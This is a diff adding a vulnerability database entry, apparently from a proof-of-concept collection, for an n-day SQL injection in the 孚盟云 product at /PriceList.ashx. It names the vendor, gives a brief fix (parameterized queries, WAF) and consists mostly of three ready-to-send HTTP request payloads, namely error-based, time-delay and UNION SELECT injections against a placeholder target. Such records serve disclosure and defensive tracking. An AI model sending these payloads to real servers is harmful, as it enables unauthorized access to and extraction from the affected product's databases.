@@ -1,0 +1,13 @@
+vendor = "孚盟云"
+name = "孚盟云 SQL 注入漏洞 TVD-2026-15690"
+type = "SQL注入"
+path = "/PriceList.ashx"
+version = ""
+detail = """GET /PriceList.ashx?id=1' AND 1=CONVERT(int,@@version)-- HTTP/1.1 Host: target
+GET /PriceList.ashx?id=1' WAITFOR DELAY '0:0:5'-- HTTP/1.1 Host: target
+GET /PriceList.ashx?id=-1' UNION SELECT 1,2,3,@@version,5-- HTTP/1.1 Host: target"""
+fix = "参数化查询；WAF 拦截"
+date = 20260601
+label = "nday"
+cve = "TVD-2026-15690"
+verifier = "AdySec"
